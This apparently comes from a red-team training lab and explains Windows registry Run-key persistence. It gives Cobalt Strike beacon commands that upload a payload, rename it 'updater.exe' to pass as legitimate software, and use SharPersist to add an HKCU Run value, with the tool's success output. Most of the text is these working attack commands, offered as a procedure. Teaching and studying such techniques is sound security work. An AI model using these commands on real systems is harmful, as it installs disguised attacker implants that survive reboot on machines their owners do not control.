AutoRun values in HKCU and HKLM allow applications to start on boot. You commonly see these to start native and 3rd party applications such as software updaters, download assistants, driver utilities and so on.

Generate a Windows EXE payload and upload it to the target.

```shell
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\beacon-http.exe
beacon> mv beacon-http.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

[*] INFO: Adding registry persistence
[*] INFO: Command: C:\ProgramData\Updater.exe
[*] INFO: Command Args: /q /n
[*] INFO: Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[*] INFO: Registry Value: Updater
[*] INFO: Option: 
[+] SUCCESS: Registry persistence added
```

Where:

-   `-k` is the registry key to modify.
-   `-v` is the name of the registry key to create.

  

As before, you can test this by rebooting the VM.
